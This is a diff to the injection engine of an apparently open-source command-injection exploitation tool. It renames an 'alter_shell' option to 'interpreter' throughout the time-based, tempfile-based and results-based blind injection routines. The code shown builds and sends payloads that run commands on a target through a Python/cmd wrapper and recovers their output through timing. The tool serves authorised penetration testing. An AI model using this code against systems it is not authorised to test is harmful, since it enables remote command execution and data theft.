@@ -53,7 +53,7 @@ def _abort_executor(executor, exc):
 """
 The main time-realative command injection exploitation.
 """
-def time_related_injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response, technique):
+def time_related_injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, interpreter, filename, url_time_response, technique):
 
   if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
     from src.core.injections.blind.techniques.time_based import tb_payloads as payloads
@@ -62,7 +62,7 @@ def time_related_injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespa
 
   if settings.TARGET_OS == settings.OS.WINDOWS:
     previous_cmd = cmd
-    if alter_shell:
+    if interpreter:
       if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
         cmd = settings.WIN_PYTHON_INTERPRETER + " -c \"import os; print len(os.popen('cmd /c " + cmd + "').read().strip())\""
       else:
@@ -213,7 +213,7 @@ def time_related_injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespa
     # instead of redoing the whole bisection/validation dance.
     output_length = _cached_length
     found_chars = True
-    if technique == settings.INJECTION_TECHNIQUE.TEMP_FILE_BASED and not alter_shell:
+    if technique == settings.INJECTION_TECHNIQUE.TEMP_FILE_BASED and not interpreter:
       # Convert leftover raw file output to decimal before extraction starts.
       payload = payloads.cmd_execution(separator, cmd, output_length, OUTPUT_TEXTFILE, timesec, http_request_method)
       _measure_length(payload)
@@ -226,14 +226,13 @@ def time_related_injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespa
     info_msg += "." if settings.VERBOSITY_LEVEL != 0 else ", please wait..."
     settings.print_data_to_stdout(settings.END_LINE.CR + settings.print_info_msg(info_msg))
 
-    # The tempfile-based oracle now also tests <= (not just ==), so it bisects the same way
-    # as time-based - only the experimental alter_shell path is still exact-match-only.
-    if not (technique == settings.INJECTION_TECHNIQUE.TEMP_FILE_BASED and alter_shell):
+    # Tempfile-based oracle now supports <=, so it bisects like time-based; only the experimental path remains exact-match-only.
+    if not (technique == settings.INJECTION_TECHNIQUE.TEMP_FILE_BASED and interpreter):
       # Binary search the output length, mirroring _bisect_once() below.
       def _length_delayed(candidate):
         if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
-          if alter_shell:
-            payload = payloads.get_length_alter_shell(separator, cmd, candidate, timesec, http_request_method)
+          if interpreter:
+            payload = payloads.get_length_alter_interpreter(separator, cmd, candidate, timesec, http_request_method)
           else:
             payload = payloads.get_length(separator, cmd, candidate, timesec, http_request_method)
         else:
@@ -329,9 +328,9 @@ def time_related_injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespa
           # The boundary check leaves raw output; convert it to decimal before extraction starts.
           _length_delayed(output_length)
     else:
-      # Experimental alter_shell path only - its oracle is still exact-match, not bisectable.
+      # Experimental interpreter path only - its oracle is still exact-match, not bisectable.
       for candidate_length in range(int(minlen), int(maxlen)):
-        payload = payloads.cmd_execution_alter_shell(separator, cmd, candidate_length, OUTPUT_TEXTFILE, timesec, http_request_method)
+        payload = payloads.cmd_execution_alter_interpreter(separator, cmd, candidate_length, OUTPUT_TEXTFILE, timesec, http_request_method)
         if _measure_length(payload):
           output_length = candidate_length
           found_chars = True
@@ -611,12 +610,12 @@ def time_related_injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespa
       nonlocal timesec
       char_pool = checks.generate_char_pool(num_of_chars)
 
-      if alter_shell:
+      if interpreter:
         # Alternative shells are still experimental.
         target = cmd if technique == settings.INJECTION_TECHNIQUE.TIME_BASED else OUTPUT_TEXTFILE
 
         def _delayed(candidate, operator, local_timesec):
-          payload = payloads.get_char_alter_shell(separator, target, num_of_chars, candidate, local_timesec, http_request_method, operator=operator)
+          payload = payloads.get_char_alter_interpreter(separator, target, num_of_chars, candidate, local_timesec, http_request_method, operator=operator)
           exec_time, _, _, _, _ = requests.perform_injection(prefix, suffix, whitespace, payload, vuln_parameter, http_request_method, url)
           # Use the adaptive threshold instead of fixed values calibrated to a timesec that may have shrunk.
           return checks.time_related_shell(url_time_response, exec_time, local_timesec)
@@ -773,9 +772,9 @@ def time_related_injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespa
 """
 The main results-based command injection exploitation.
 """
-def results_based_injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, technique):
+def results_based_injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, interpreter, filename, technique):
 
-  def check_injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, technique):
+  def check_injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, interpreter, filename, technique):
     if technique == settings.INJECTION_TECHNIQUE.CLASSIC or technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
       from src.core.injections.results_based.techniques.classic import cb_payloads as payloads
     elif technique == settings.INJECTION_TECHNIQUE.DYNAMIC_CODE:
@@ -783,11 +782,11 @@ def results_based_injection(separator, TAG, cmd, prefix, suffix, whitespace, htt
     else:
       from src.core.injections.semiblind.techniques.file_based import fb_payloads as payloads
 
-    if alter_shell:
+    if interpreter:
       if technique != settings.INJECTION_TECHNIQUE.FILE_BASED and technique != settings.INJECTION_TECHNIQUE.TEMP_FILE_BASED:
-        payload = payloads.cmd_execution_alter_shell(separator, TAG, cmd)
+        payload = payloads.cmd_execution_alter_interpreter(separator, TAG, cmd)
       else:
-        payload = payloads.cmd_execution_alter_shell(separator, cmd, OUTPUT_TEXTFILE)
+        payload = payloads.cmd_execution_alter_interpreter(separator, cmd, OUTPUT_TEXTFILE)
     else:
       if technique != settings.INJECTION_TECHNIQUE.FILE_BASED and technique != settings.INJECTION_TECHNIQUE.TEMP_FILE_BASED:
         payload = payloads.cmd_execution(separator, TAG, cmd)
@@ -807,13 +806,13 @@ def results_based_injection(separator, TAG, cmd, prefix, suffix, whitespace, htt
     response, vuln_parameter, payload, prefix, suffix = requests.perform_injection(prefix, suffix, whitespace, payload, vuln_parameter, http_request_method, url)
     return response
 
-  response = check_injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, technique)
+  response = check_injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, interpreter, filename, technique)
   
   if technique == settings.INJECTION_TECHNIQUE.CLASSIC or technique == settings.INJECTION_TECHNIQUE.DYNAMIC_CODE:
     tries = 0
     while not response:
       if tries < (menu.options.failed_tries / 2):
-        response = check_injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, technique)
+        response = check_injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, interpreter, filename, technique)
         tries = tries + 1
       else:
         err_msg = "Something went wrong. The request has failed (" + str(tries) + ") times in a row."
@@ -826,7 +825,7 @@ def results_based_injection(separator, TAG, cmd, prefix, suffix, whitespace, htt
 """
 False-positive check and evaluation.
 """
-def false_positive_check(separator, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, randvcalc, alter_shell, exec_time, url_time_response, false_positive_warning, technique, retry_attempt=None, retry_total=None, silent=False):
+def false_positive_check(separator, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, randvcalc, interpreter, exec_time, url_time_response, false_positive_warning, technique, retry_attempt=None, retry_total=None, silent=False):
 
   if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
     from src.core.injections.blind.techniques.time_based import tb_payloads as payloads
@@ -842,7 +841,7 @@ def false_positive_check(separator, TAG, cmd, prefix, suffix, whitespace, timese
     timesec = timesec + random.randint(3, 5)
 
   # Verify the oracle with known logical properties; any failed relationship invalidates the round.
-  if settings.TARGET_OS != settings.OS.WINDOWS and not alter_shell:
+  if settings.TARGET_OS != settings.OS.WINDOWS and not interpreter:
     a, c, b = sorted(random.sample(range(1, 50), 3))
     # End on a must-delay check; the caller re-validates the final exec_time.
     litmus_checks = [
@@ -884,7 +883,7 @@ def false_positive_check(separator, TAG, cmd, prefix, suffix, whitespace, timese
 
   if settings.TARGET_OS == settings.OS.WINDOWS:
     previous_cmd = cmd
-    if alter_shell:
+    if interpreter:
       if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
         cmd = settings.WIN_PYTHON_INTERPRETER + " -c \"import os; print len(os.popen('cmd /c " + cmd + "').read().strip())\""
       else:
@@ -899,11 +898,11 @@ def false_positive_check(separator, TAG, cmd, prefix, suffix, whitespace, timese
   output_length = 1
   if not silent and settings.VERBOSITY_LEVEL == 0:
     settings.print_data_to_stdout(".")
-  if alter_shell:
+  if interpreter:
     if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
-      payload = payloads.cmd_execution_alter_shell(separator, cmd, output_length, timesec, http_request_method)
+      payload = payloads.cmd_execution_alter_interpreter(separator, cmd, output_length, timesec, http_request_method)
     else:
-      payload = payloads.cmd_execution_alter_shell(separator, cmd, output_length, OUTPUT_TEXTFILE, timesec, http_request_method)
+      payload = payloads.cmd_execution_alter_interpreter(separator, cmd, output_length, OUTPUT_TEXTFILE, timesec, http_request_method)
   else:
     if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
       payload = payloads.cmd_execution(separator, cmd, output_length, timesec, http_request_method)
@@ -942,11 +941,11 @@ def false_positive_check(separator, TAG, cmd, prefix, suffix, whitespace, timese
     for ascii_char in range(1, 8):
       if not silent and settings.VERBOSITY_LEVEL == 0:
         settings.print_data_to_stdout(".")
-      if alter_shell:
+      if interpreter:
         if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
-          payload = payloads.fp_result_alter_shell(separator, cmd, 1, ascii_char, timesec, http_request_method)
+          payload = payloads.fp_result_alter_interpreter(separator, cmd, 1, ascii_char, timesec, http_request_method)
         else:
-          payload = payloads.fp_result_alter_shell(separator, OUTPUT_TEXTFILE, 1, ascii_char, timesec, http_request_method)
+          payload = payloads.fp_result_alter_interpreter(separator, OUTPUT_TEXTFILE, 1, ascii_char, timesec, http_request_method)
       else:
         if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
           payload = payloads.fp_result(separator, cmd, 1, ascii_char, timesec, http_request_method)
@@ -1181,7 +1180,7 @@ def injection_results(response, TAG, cmd, technique, url, OUTPUT_TEXTFILE, times
       except UnicodeDecodeError:
         pass
       if settings.TARGET_OS == settings.OS.WINDOWS:
-        if menu.options.alter_shell:
+        if menu.options.interpreter:
           shell = [right_space.rstrip() for right_space in shell]
           shell = [left_space.lstrip() for left_space in shell]
           if "<<<<" in shell[0]:
